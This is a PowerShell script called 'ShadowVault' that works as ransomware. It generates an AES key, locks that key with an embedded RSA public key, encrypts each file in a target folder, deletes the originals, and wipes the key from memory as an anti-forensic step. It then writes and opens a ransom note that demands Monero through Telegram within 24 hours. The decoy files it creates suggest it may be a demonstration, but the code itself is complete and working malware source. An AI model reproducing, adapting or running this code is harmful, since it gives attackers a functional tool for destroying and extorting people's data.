# =============================================================================
#  SHADOWVAULT - HYBRID ENCRYPTION (RSA + AES)
#  Performs AES encryption on files and secures the session key using Alice's
#  RSA Public Key.
# =============================================================================

# --- CONFIGURATION ---
$targetDir = "C:\Users\Public\Documents\Legal_Files"
$ransomNotePath = "$targetDir\#RANSOM_NOTICE.txt"
$sessionKeyPath = "$targetDir\RECOVERY_ID.key" # Stores the AES key encrypted with RSA

# --- [!] PASTE ALICE'S PUBLIC KEY HERE ---
$AlicePublicKeyXML = @"
<RSAKeyValue><Modulus>tBpS3qBGHVRDeHutUUwdO5zxi0N1XmZEPTZQ9QAFzQUbgHmRbUSTj92fS62/n4peuNVxbWZTJbW91DVP8i5i8L75c7HCJO/OQYYA30Rz9imB8ONJikD/zuPcwi6+lqFmQ2Yq8F8SaiWa9v9Cdk30F1CFMiHDBHijg1EQ1rammJFP8KlMluhkRp5L/vPAaAre4+yhawWG3FJWhDZJdolTw4k8a+bqfP8ZE9FGOgoVlFI/wj4jmQGEXKrVu1AOHzKJPhs9aVn3AsQVUDA9sSF5ZqnOgyf4xGk5nOxH0u1p9ucRFb9dHAcM8tO0nLbTKFhiDi+uBgNx18MJ56Dz7NJNLQ==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>
"@

# Load libraries
Add-Type -AssemblyName System.Security

# 1. Environment preparation
Write-Host "[*] Initializing ShadowVault..." -ForegroundColor Red
if (!(Test-Path $targetDir)) {
    New-Item -ItemType Directory -Force -Path $targetDir | Out-Null
    Set-Content -Path "$targetDir\Confidential_Contract.docx" -Value "STRICTLY CONFIDENTIAL"
    Set-Content -Path "$targetDir\Q4_Budget_2025.xlsx" -Value "FINANCIAL PROJECTIONS Q4"
    Set-Content -Path "$targetDir\Client_Database.db" -Value "PII DATA - GDPR PROTECTED"
    Write-Host "[+] Decoy files created at $targetDir" -ForegroundColor Yellow
}

# 2. Ephemeral key generation (AES)
# This key is generated in the victim's RAM. It is unique to this session.
$aesManaged = New-Object System.Security.Cryptography.RijndaelManaged
$aesManaged.KeySize = 256
$aesManaged.GenerateKey()
$aesManaged.GenerateIV()

$sessionKey = $aesManaged.Key
$sessionIV = $aesManaged.IV

# 3. Session key encryption (RSA)
# Use Alice's Public Key to lock the AES key.
# Only Alice with the Private Key can recover $sessionKey.
$rsa = New-Object System.Security.Cryptography.RSACryptoServiceProvider
$rsa.FromXmlString($AlicePublicKeyXML)

# Concatenate IV + KEY to encrypt them together
$dataToProtect = $sessionIV + $sessionKey
$encryptedSessionBlob = $rsa.Encrypt($dataToProtect, $false)

# Save the encrypted key to disk (The victim must send this to Alice)
[System.IO.File]::WriteAllBytes($sessionKeyPath, $encryptedSessionBlob)
Write-Host "[*] Session key encrypted and saved to RECOVERY_ID.key" -ForegroundColor Yellow

# 4. File encryption (AES)
function Protect-File {
    param($Path, $Key, $IV)
    try {
        $aes = New-Object System.Security.Cryptography.RijndaelManaged
        $aes.KeySize = 256; $aes.BlockSize = 128
        $aes.Key = $Key; $aes.IV = $IV
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
       
        $encryptor = $aes.CreateEncryptor()
        $plainBytes = [System.IO.File]::ReadAllBytes($Path)
       
        $ms = New-Object System.IO.MemoryStream
        $cs = New-Object System.Security.Cryptography.CryptoStream($ms, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
        $cs.Write($plainBytes, 0, $plainBytes.Length)
        $cs.FlushFinalBlock()
       
        [System.IO.File]::WriteAllBytes("$Path.locked", $ms.ToArray())
        Remove-Item -Path $Path -Force
        Write-Host " -> Locked: $(Split-Path $Path -Leaf)" -ForegroundColor DarkRed
    } catch { Write-Host " [!] Error processing $Path" }
}

$files = Get-ChildItem -Path $targetDir -File | Where-Object {
    $_.Extension -ne ".locked" -and $_.Extension -ne ".key" -and $_.Name -ne "#RANSOM_NOTICE.txt"
}

if ($files) {
    foreach ($file in $files) {
        Protect-File -Path $file.FullName -Key $sessionKey -IV $sessionIV
    }
}

# 5. Memory cleanup (Anti-forensics)
# Wipe the AES key from RAM. Now only the encrypted version exists on disk.
$aesManaged.Clear()
$sessionKey = $null
$sessionIV = $null
[System.GC]::Collect()

# 6. Ransom note generation
$note = @"
===================================================
   !!! YOUR FILES HAVE BEEN ENCRYPTED !!!
===================================================

Attack ID: ShadowVault
Target: Legal Department

Don't worry, you can return all your files!
All your documents, databases, and budgets have been locked with
military-grade encryption.

The ONLY method of recovering files is to purchase the unique key
for you. Attempts to recover them without the key will result in
permanent data loss.

WHAT GUARANTEES DO WE GIVE?
You can send one of your encrypted file from your PC along with your
'RECOVERY_ID.key' and we decrypt it for free. But we can decrypt only
1 file for free. File must not contain valuable information.

PAYMENT INSTRUCTIONS:
1. Send 30 XMR (Monero) to wallet: 442uGwAd2V...
2. Send proof of payment to our Telegram Bot.

You have 24 hours. The clock is ticking...

-- Alice
"@

Set-Content -Path $ransomNotePath -Value $note

# 7. Visual impact (Launch note)
Write-Host "[!] Deploying ransom note..." -ForegroundColor Red
Start-Process "notepad.exe" $ransomNotePath